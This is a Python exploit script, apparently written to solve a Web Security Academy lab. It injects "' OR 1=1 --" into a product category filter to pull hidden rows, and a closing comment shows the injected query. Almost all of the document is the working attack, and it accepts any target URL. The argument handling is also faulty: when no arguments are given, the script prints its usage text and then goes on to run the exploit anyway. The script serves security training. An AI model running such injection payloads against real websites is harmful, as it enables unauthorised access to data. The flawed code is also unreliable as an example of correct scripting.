# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

import requests #pip install requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080' }

# url = 'https://0ac5004d0489485280c2170e001a0090.web-security-academy.net'
# payload = "' OR 1=1 --"

def exploit_sqli(url, payload):
    uri = '/filter?category='
    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
    if "Cat Grin" in r.text:
        return True
    else:
        return False
    
if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print ("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print ('[-] Example: %s www.example.com "1=1"' % sys.argv[0])

if exploit_sqli(url, payload):
    print("[+] SQL injection successfully")
else:
    print("[-] SQL injection failed")

# SELECT * FROM products WHERE Category = '' OR 1=1 --' AND released = 1
